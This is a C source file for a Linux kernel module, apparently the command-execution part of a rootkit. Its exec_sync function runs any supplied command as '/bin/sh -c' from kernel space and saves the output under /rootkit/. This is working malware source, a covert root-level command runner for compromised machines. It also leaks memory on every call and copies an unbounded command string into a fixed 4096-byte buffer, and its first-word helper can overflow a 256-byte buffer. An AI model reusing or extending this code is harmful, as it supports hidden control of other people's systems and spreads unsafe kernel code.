#include "exec.h"

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/timekeeping.h>

static char out_file[256] = { 0 };
static char err_file[256] = { 0 };

static void get_first_word(const char *cmd, char *dst)
{
    int i = 0;
    for (; cmd[i] != '\0' && cmd[i] != ' '; ++i)
        ;
    memcpy(dst, cmd, i);
}

char *get_last_outfile(void)
{
    return out_file;
}

char *get_last_errfile(void)
{
    return err_file;
}

int exec_sync(const char *cmd_str, int *ret)
{
    struct subprocess_info *sub_info = NULL;
    char cmd_first_word[256] = { 0 };
    char *cmd = NULL;
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    int status = 0;
    struct timespec ts;
    __kernel_time_t time;

    getnstimeofday(&ts);
    time = ts.tv_sec;
    pr_info("exec: running '%s'\n", cmd_str);
    cmd = kmalloc(4096, GFP_KERNEL);
    if (!cmd)
    {
        pr_err("exec: failed to malloc cmd.\n");
        return 1;
    }

    get_first_word(cmd_str, cmd_first_word);
    snprintf(out_file, 256, "%s_out_%ld", cmd_first_word, time);
    snprintf(err_file, 256, "%s_err_%ld", cmd_first_word, time);
    pr_info("exec: outputting to %s and %s\n", out_file, err_file);

    sprintf(cmd, "%s >/rootkit/%s 2>/rootkit/%s", cmd_str, out_file, err_file);
    argv[2] = cmd;

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL,
                                         NULL, NULL);
    if (sub_info == NULL)
    {
        pr_err("exec: failed to setup usermodehelper\n");
        kfree(cmd);
        return 1;
    }

    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    status = status >> 8;
    *ret = status;
    pr_info("exec: done. status: %d", status);

    return 0;
}
